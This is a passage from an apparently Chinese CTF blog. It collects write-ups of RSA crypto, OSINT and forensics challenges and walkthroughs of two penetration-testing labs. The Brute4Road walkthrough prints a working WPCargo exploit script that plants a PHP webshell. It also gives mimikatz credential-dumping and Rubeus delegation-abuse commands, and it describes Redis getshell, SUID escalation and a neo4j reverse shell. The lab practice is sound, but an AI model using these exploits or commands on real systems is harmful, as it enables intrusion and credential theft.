class="string">f&quot;e1 = <span class="subst">&#123;e1&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p1_given = <span class="subst">&#123;p1&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- 第二部分 ---&quot;</span>)</span><br><span class="line">    p2_bits = <span class="number">256</span> </span><br><span class="line">    p2 = getPrime(p2_bits)</span><br><span class="line">    q2 = gmpy2.next_prime(p2)   </span><br><span class="line">    n2 = p2 * q2</span><br><span class="line">    phi2 = (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">    e2 = <span class="number">65537</span></span><br><span class="line">    c2 = <span class="built_in">pow</span>(m2_val, e2, n2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;n2 = <span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;e2 = <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- 第三部分 ---&quot;</span>)</span><br><span class="line">    e3 = <span class="number">3</span></span><br><span class="line">    m3_bits = m3_val.bit_length()</span><br><span class="line">    </span><br><span class="line">    p3_q3_bits = <span class="number">128</span> </span><br><span class="line">    <span class="keyword">if</span> m3_bits * e3 &gt;= p3_q3_bits * <span class="number">2</span> - <span class="number">10</span> : </span><br><span class="line">        p3_q3_bits = (m3_bits * e3 // <span class="number">2</span>) + <span class="number">20</span> </span><br><span class="line"></span><br><span class="line">    p3 = getPrime(p3_q3_bits)</span><br><span class="line">    <span class="keyword">while</span> (p3 - <span class="number">1</span>) % e3 == <span class="number">0</span>: </span><br><span class="line">        p3 = getPrime(p3_q3_bits)</span><br><span class="line">        </span><br><span class="line">    q3 = getPrime(p3_q3_bits)</span><br><span class="line">    <span class="keyword">while</span> (q3 - <span class="number">1</span>) % e3 == <span class="number">0</span> <span class="keyword">or</span> p3 == q3:</span><br><span class="line">        q3 = getPrime(p3_q3_bits)</span><br><span class="line">    n3 = p3 * q3   </span><br><span class="line">    phi3 = (p3 - <span class="number">1</span>) * (q3 - <span class="number">1</span>)</span><br><span class="line">    c3 = <span class="built_in">pow</span>(m3_val, e3, n3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;n3 = <span class="subst">&#123;n3&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;e3 = <span class="subst">&#123;e3&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c3 = <span class="subst">&#123;c3&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- 第四部分 ---&quot;</span>)</span><br><span class="line">    p4_bits = <span class="number">256</span></span><br><span class="line">    q4_bits = <span class="number">256</span></span><br><span class="line">    p4 = getPrime(p4_bits)</span><br><span class="line">    q4 = getPrime(q4_bits)</span><br><span class="line">    <span class="keyword">while</span> p4 == q4:</span><br><span class="line">        q4 = getPrime(q4_bits)</span><br><span class="line">    n4 = p4 * q4</span><br><span class="line">    phi4 = (p4 - <span class="number">1</span>) * (q4 - <span class="number">1</span>)</span><br><span class="line">    e4a = <span class="number">65537</span></span><br><span class="line">    e4b = <span class="number">65539</span></span><br><span class="line">    c4a = <span class="built_in">pow</span>(m4_val, e4a, n4)</span><br><span class="line">    c4b = <span class="built_in">pow</span>(m4_val, e4b, n4)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;n4 = <span class="subst">&#123;n4&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;e4a = <span class="subst">&#123;e4a&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c4a = <span class="subst">&#123;c4a&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;e4b = <span class="subst">&#123;e4b&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;c4b = <span class="subst">&#123;c4b&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">40</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;生成完畢。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">--- 第一部分 ---</span></span><br><span class="line"><span class="string">n1 = 6812896682529270617889699041268397231216344502100994418898483090399363050725238802825519610890413646309466494321918636827383749031784541498873387892731639</span></span><br><span class="line"><span class="string">e1 = 65537</span></span><br><span class="line"><span class="string">c1 = 4427729071087402462891221302870960264377546560852404414763265602889920597278631371895561554533422266459579128710764143355754615245149034250540901716118396</span></span><br><span class="line"><span class="string">p1_given = 83018022170775357156881992679804004613671250493281300137495505566721083549673</span></span><br><span class="line"><span class="string">----------------------------------------</span></span><br><span class="line"><span class="string">--- 第二部分 ---</span></span><br><span class="line"><span class="string">n2 = 8618941019390135762450560251440447449812344988348002904674567734387521342905027779518989812368861070593805164745239666403382823700616097172234834567736147</span></span><br><span class="line"><span class="string">e2 = 65537</span></span><br><span class="line"><span class="string">c2 = 5090157394401735030895991956180326655655690673641213577889910602055845449426923727333236685488219458241927620516575355892867356153466992699239192192910803</span></span><br><span class="line"><span class="string">----------------------------------------</span></span><br><span class="line"><span class="string">--- 第三部分 ---</span></span><br><span class="line"><span class="string">n3 = 44935859354785283479720490973543160302824014776763758544522532443340696020267</span></span><br><span class="line"><span class="string">e3 = 3</span></span><br><span class="line"><span class="string">c3 = 345422409558921105091064923418692102360936093114398968000</span></span><br><span class="line"><span class="string">----------------------------------------</span></span><br><span class="line"><span class="string">--- 第四部分 ---</span></span><br><span class="line"><span class="string">n4 = 8050202063335318202668477773676061807230884209991655693527143039730083343444420055444708024772406517257344636757261685775610919720030730312364281795306843</span></span><br><span class="line"><span class="string">e4a = 65537</span></span><br><span class="line"><span class="string">c4a = 5944697746898769084130690069563137465626689325180948580645355816012208942196895961186706314322689146225405184339425445878469418993890870252122256787094490</span></span><br><span class="line"><span class="string">e4b = 65539</span></span><br><span class="line"><span class="string">c4b = 590873621149745423995166880880817186889129377479311590030588253033344142558245476231076545393071246375504750217939956792516706707037717951120503693278372</span></span><br><span class="line"><span class="string">========================================</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>第一部分有了p直接算就行</p><p>第二部分p和q十分接近，所以可以通过开根去nextprime挨个试</p><p>第三部分低指数幂攻击</p><p>第四部分共模攻击</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n1 = <span class="number">6812896682529270617889699041268397231216344502100994418898483090399363050725238802825519610890413646309466494321918636827383749031784541498873387892731639</span></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">c1 = <span class="number">4427729071087402462891221302870960264377546560852404414763265602889920597278631371895561554533422266459579128710764143355754615245149034250540901716118396</span></span><br><span class="line">p1 = <span class="number">83018022170775357156881992679804004613671250493281300137495505566721083549673</span></span><br><span class="line">q1=n1//p1</span><br><span class="line">phi1=(p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d1=gmpy2.invert(<span class="number">65537</span>,phi1)</span><br><span class="line">m1=long_to_bytes(<span class="built_in">pow</span>(c1,d1,n1))</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">8618941019390135762450560251440447449812344988348002904674567734387521342905027779518989812368861070593805164745239666403382823700616097172234834567736147</span></span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">5090157394401735030895991956180326655655690673641213577889910602055845449426923727333236685488219458241927620516575355892867356153466992699239192192910803</span></span><br><span class="line">tmp2=gmpy2.iroot(n2,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> n2%tmp2 !=<span class="number">0</span>:</span><br><span class="line">    tmp2=gmpy2.next_prime(tmp2)</span><br><span class="line">p2=n2//tmp2</span><br><span class="line">q2=tmp2</span><br><span class="line">phi2=(p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2=gmpy2.invert(<span class="number">65537</span>,phi2)</span><br><span class="line">m2=long_to_bytes(<span class="built_in">pow</span>(c2,d2,n2))</span><br><span class="line"></span><br><span class="line">n3 = <span class="number">44935859354785283479720490973543160302824014776763758544522532443340696020267</span></span><br><span class="line">e3 = <span class="number">3</span></span><br><span class="line">c3 = <span class="number">345422409558921105091064923418692102360936093114398968000</span></span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    mm=c3+n3*k</span><br><span class="line">    m3,flag=gmpy2.iroot(mm,e3)</span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span>==flag:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k+=<span class="number">1</span></span><br><span class="line">m3=long_to_bytes(m3)</span><br><span class="line"></span><br><span class="line">n4 = <span class="number">8050202063335318202668477773676061807230884209991655693527143039730083343444420055444708024772406517257344636757261685775610919720030730312364281795306843</span></span><br><span class="line">e4a = <span class="number">65537</span></span><br><span class="line">c4a = <span class="number">5944697746898769084130690069563137465626689325180948580645355816012208942196895961186706314322689146225405184339425445878469418993890870252122256787094490</span></span><br><span class="line">e4b = <span class="number">65539</span></span><br><span class="line">c4b = <span class="number">590873621149745423995166880880817186889129377479311590030588253033344142558245476231076545393071246375504750217939956792516706707037717951120503693278372</span></span><br><span class="line">_gcd,s1,s2=gmpy2.gcdext(e4a,e4b)</span><br><span class="line">m4=long_to_bytes(<span class="built_in">pow</span>(c4a,s1,n4)*<span class="built_in">pow</span>(c4b,s2,n4)%n4)</span><br><span class="line"><span class="built_in">print</span>(m1+m2+m3+m4)</span><br><span class="line"><span class="comment">#b&#x27;MOCSCTF&#123;y0U_AR3_a_gO0d_learN3er&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="osint">OSINT</h2><h3 id="ez-college">ez-college</h3><p>一搜就是成都大学</p><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713191236972.png"alt="image-20250713191236972" /><figcaption aria-hidden="true">image-20250713191236972</figcaption></figure><h2 id="forensics">Forensics</h2><h3 id="easymem">easymem</h3><p>在查看记事本的时候就发现了flag（</p><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713191440783.png"alt="image-20250713191440783" /><figcaption aria-hidden="true">image-20250713191440783</figcaption></figure><h3 id="easysword">easysword</h3><p>看题目名字就盲猜某webshell工具流量，直接丢给Net-A梭一下看，找到有个压缩包</p><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713191704829.png"alt="image-20250713191704829" /><figcaption aria-hidden="true">image-20250713191704829</figcaption></figure><p>里面的文件都特别小，所以爆破CRC</p><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713191811263.png"alt="image-20250713191811263" /><figcaption aria-hidden="true">image-20250713191811263</figcaption></figure><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713191903694.png"alt="image-20250713191903694" /><figcaption aria-hidden="true">image-20250713191903694</figcaption></figure><p>注意他是按这个顺序排的，得记得换回来（</p><figure><img src="/images/MOCSCTF2025-Writeup/image-20250713191938726.png"alt="image-20250713191938726" /><figcaption aria-hidden="true">image-20250713191938726</figcaption></figure><p>MOCSCTF{9fc0b9fd2d3f666c8e3631dce9fe2d4d}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> LitCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>R3CTF2025 Writeup</title>
      <link href="/posts/ca458d1f/"/>
      <url>/posts/ca458d1f/</url>
      
        <content type="html"><![CDATA[<blockquote><p>R3的题还是太顶了，题量大但只会签到（</p></blockquote><h2 id="forensics">Forensics</h2><h3 id="the-r3-pig-problem">The R3 Pig Problem</h3><p>打开可以看到很多tcp流，这些tcp流的时间戳存在规律</p><figure><img src="/images/R3CTF2025-Writeup/image-20250706142646509.png"alt="image-20250706142646509" /><figcaption aria-hidden="true">image-20250706142646509</figcaption></figure><p>提取出来，计算时间差，接近0.02的记为0，接近0.1的记为1</p><figure><img src="/images/R3CTF2025-Writeup/image-20250706142756381.png"alt="image-20250706142756381" /><figcaption aria-hidden="true">image-20250706142756381</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">classify_time_diff</span>(<span class="params">diff</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(diff - <span class="number">0.02</span>) &lt; <span class="built_in">abs</span>(diff - <span class="number">0.1</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line"></span><br><span class="line">    i = <span class="number">1</span> </span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(lines)-<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current = <span class="built_in">float</span>(lines[i+<span class="number">2</span>].strip())</span><br><span class="line">            previous = <span class="built_in">float</span>(lines[i].strip())</span><br><span class="line">            diff = current - previous</span><br><span class="line">            bit = classify_time_diff(diff)</span><br><span class="line">            result.append(bit)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;跳过无效行: 第 <span class="subst">&#123;i+<span class="number">1</span>&#125;</span> 行&quot;</span>)</span><br><span class="line">        i += <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    input_file = <span class="string">&#x27;output.txt&#x27;</span> </span><br><span class="line">    binary_string = process_file(input_file)</span><br><span class="line">    <span class="built_in">print</span>(binary_string)</span><br></pre></td></tr></table></figure><p>cyberchef转换一下</p><figure><img src="/images/R3CTF2025-Writeup/image-20250706143021382.png"alt="image-20250706143021382" /><figcaption aria-hidden="true">image-20250706143021382</figcaption></figure><h2 id="misc">Misc</h2><blockquote><p>一个签到一个签退就不写了（</p></blockquote><h3 id="r3girl-in-paris">R3GIRL In Paris</h3><p>不难找到这个地方在巴黎的china town</p><figure><img src="/images/R3CTF2025-Writeup/image-20250706143424357.png"alt="image-20250706143424357" /><figcaption aria-hidden="true">image-20250706143424357</figcaption></figure><figure><img src="/images/R3CTF2025-Writeup/image-20250706143449758.png"alt="image-20250706143449758" /><figcaption aria-hidden="true">image-20250706143449758</figcaption></figure><p>在这些网站上都能找到艺术家名称</p><p>https://www.tripadvisor.fr/ShowUserReviews-g187147-d16881390-r661798726-Fresque_De_tous_pays_viendront_tes_enfants-Paris_Ile_de_France.html</p><p>https://www.trompe-l-oeil.info/Murspeints/details.php?image_id=9303</p><p>R3CTF{Eglise-Notre-Dame-de-Chine-Cyril-David}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> R3CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Brute4Road</title>
      <link href="/posts/b6e8119b/"/>
      <url>/posts/b6e8119b/</url>
      
        <content type="html"><![CDATA[<p>fscan扫一遍，发现存在redis未授权漏洞</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751640079625-52e82a8a-dd14-4fe5-ab7a-6e8318a9af90.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用脚本getshell</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751643438389-81b52b24-211b-4586-a8bc-bd8f3a55acc7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>发现没有权限读flag，发现可以利用base64命令suid提权</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751643694710-bc4e25ae-5345-4534-8e23-6cb552a5299e.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751643736122-14266eac-d66a-4b05-bfab-57ceb43a96cb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751643718070-f2b54cac-54ec-4068-9104-4a33c474677b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>传个fscan上去扫一下内网</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751644003362-57f08a9a-7b2c-46b3-b8e5-88bab7a01658.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751644214088-ba2d3586-6c67-4503-ae8d-d78aeca38b2b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751644227388-db1f3a2a-575c-42c6-8e43-cbf61b8d2a85.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>先尝试攻击搭建了wordpress的那台主机</p><p>wpscan扫一遍，扫出来有个wpcargo插件</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751644670539-d7d3e1c3-aebf-4c33-8c5a-6710dba114c3.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用脚本写入木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is a magic string that when treated as pixels and compressed using the png</span></span><br><span class="line"><span class="comment"># algorithm, will cause &lt;?=$_GET[1]($_POST[2]);?&gt; to be written to the png file</span></span><br><span class="line">payload = <span class="string">&#x27;2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_character_code</span>(<span class="params">c: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">text = <span class="string">&#x27;&#x27;</span>.join([encode_character_code(c) <span class="keyword">for</span> c <span class="keyword">in</span> binascii.unhexlify(payload)])[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">destination_url = <span class="string">&#x27;http://172.22.2.18/&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;ls&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With 1/11 scale, &#x27;1&#x27;s will be encoded as single white pixels, &#x27;x&#x27;s as single black pixels.</span></span><br><span class="line">requests.get(</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>wp-content/plugins/wpcargo/includes/barcode.php?text=<span class="subst">&#123;text&#125;</span>&amp;sizefactor=.090909090909&amp;size=1&amp;filepath=/var/www/html/webshell.php&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># We have uploaded a webshell - now let&#x27;s use it to execute a command.</span></span><br><span class="line"><span class="built_in">print</span>(requests.post(</span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;destination_url&#125;</span>webshell.php?1=system&quot;</span>, data=&#123;<span class="string">&quot;2&quot;</span>: cmd&#125;</span><br><span class="line">).content.decode(<span class="string">&#x27;ascii&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>))</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751644773913-579235a2-0f1b-4868-b457-ab7b41b9927f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用蚁剑连接，连接类型选cmdlinux</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751649619194-351c71df-3c2f-49ab-9a14-32c83052e233.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在wp-config.php中可以找到数据库的账号密码，连接数据库找到第二个flag和提示，给了一些密码，保存下来做成一个字典</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751649643809-489002a4-d07d-4e1f-bb9b-34c23370d1e4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751649662280-c008ddda-84af-42a4-9049-d3c7ffe22263.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751649672385-685006a2-ec3b-418e-9084-358c76ec0e09.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751649687762-6f74ad5e-1ca3-4512-a63f-da8e5f4a99de.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后用得到的字典尝试爆破之前扫到的mssql服务器的密码，成功找到正确的</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751649715355-f74677f7-e4b7-4a30-9d2c-22df9c0c4fae.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用MUDT成功连接，上传甜土豆提权</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751649736689-b2664b6b-8b80-475e-bd3f-3d3f45fa46c0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751649746583-dcc1dcd5-2330-4089-a947-7afd5baa5755.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>添加用户并添加到管理组</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751649776633-221b1a28-c4c8-4840-a924-08783c4f5e17.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751649783281-5927b6b3-d1f0-4bad-a58e-bc73a5bfe241.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>远程桌面连接，找到flag3</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751649795726-b9358e95-0b98-461e-b077-50195381e4be.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>接下来是约束委派攻击</p><p>上传mimikatz获取用户哈希</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords&quot;&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751726034680-863e0e9f-8d2c-4b29-8675-0612716b3421.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用rubeus获取到TGT</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:xxx /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751726966141-96136973-9471-4118-863d-a6efbb575028.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用这个TGT申请获取域控CIFS服务的TGS票据，并注入内存</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:xxx</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Brute4Road/1751727175860-853e66c2-dcc1-453b-b27e-fcb60fc40471.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>获取域控中的flag</p><figure><imgsrc="/images/春秋云境-Brute4Road/1751727267109-ef87af1d-1868-4ae6-be2e-2b9975de1994.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Time</title>
      <link href="/posts/9aa9ec9/"/>
      <url>/posts/9aa9ec9/</url>
      
        <content type="html"><![CDATA[<h2 id="time">Time</h2><p>fscan扫一遍</p><figure><imgsrc="/images/春秋云境-Time/1751621915925-9982ae83-6200-466b-a471-2deb2adc81cf.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>有7687端口，这是neo4j的端口。这里存在CVE-2021-34371未授权RCE，我们可以以此反弹shell</p><figure><imgsrc="/images/春秋云境-Time/1751622474813-20db4921-21c2-4bc9-9237-eeecb37b3a91.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Time/1751622522935-a2b759fb-2c2a-46b5-9b30-58ef625f44a6.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到flag1和提示kerberos的认证过程</p><figure><imgsrc="/images/春秋云境-Time/1751622566189-6b2045f3-2dfe-446b-b55e-b2d7b300955b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>上传fscan扫一下，扫出来还有三台主机</p><figure><imgsrc="/images/春秋云境-Time/1751623110654-9bf68684-4897-49ff-95eb-c91f8889e53c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp，访问搭建了web服务的那台主机</p><figure><imgsrc="/images/春秋云境-Time/1751623338950-9000169a-d07b-4d68-afc7-5bb5979e8e14.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Time/1751623351420-6f0cdeba-4e02-4638-a0e6-67170eab77b3.png"alt="img" /><figcaption 